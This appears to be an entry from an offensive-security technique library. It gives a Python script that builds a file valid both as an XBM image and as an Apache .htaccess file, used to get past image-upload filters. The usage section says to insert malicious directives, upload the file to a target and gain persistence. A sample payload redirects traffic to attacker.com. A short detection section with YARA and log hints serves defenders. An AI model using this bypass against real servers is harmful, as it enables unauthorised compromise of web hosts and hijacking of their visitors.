---
id: acc8e274-6bb5-490c-913a-bfb302a72049
name: create-htaccess-xbm-image-python
type: code
language: python
verified: true
created_at: '2023-04-06T03:56:40.894446+00:00'
updated_at: '2023-04-06T03:56:40.905257+00:00'
platforms:
  - linux
  - web
tags:
  - polyglot
  - htaccess
  - xbm
validated: true
---

# create-htaccess-xbm-image-python

## Code

```python
# create valid .htaccess/xbm image

width = 50
height = 50
payload = '# .htaccess file'

with open('.htaccess', 'w') as htaccess:
    htaccess.write('#define test_width %d\n' % (width, ))
    htaccess.write('#define test_height %d\n' % (height, ))
    htaccess.write(payload)
```

## Description

This Python script generates a polyglot file valid as both an XBM image and an .htaccess configuration file. It prepends XBM header comments with width and height definitions, followed by the payload, allowing the file to pass image validation while enabling Apache to parse the directives.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| width | Image width in pixels (integer) | 50 |
| height | Image height in pixels (integer) | 50 |
| payload | String containing .htaccess directives | "RewriteEngine On\nRewriteRule ^(.*)$ http://attacker.com [R=301,L]" |

## Usage

Modify the payload variable to include malicious .htaccess rules (e.g., redirects or PHP handlers). Execute the script to create '.htaccess', then upload it to the target as an image file. Used in file upload bypass scenarios to establish persistence on Apache servers.

## Detection

- File entropy analysis showing mixed binary/text patterns.
- Strings extraction revealing Apache directives in image files.
- Web server logs showing .htaccess processing in upload directories.
- YARA rules for XBM headers followed by RewriteEngine or AddType.

## Related

- [[procedures/Image-Based-htaccess-Upload-Bypass]]
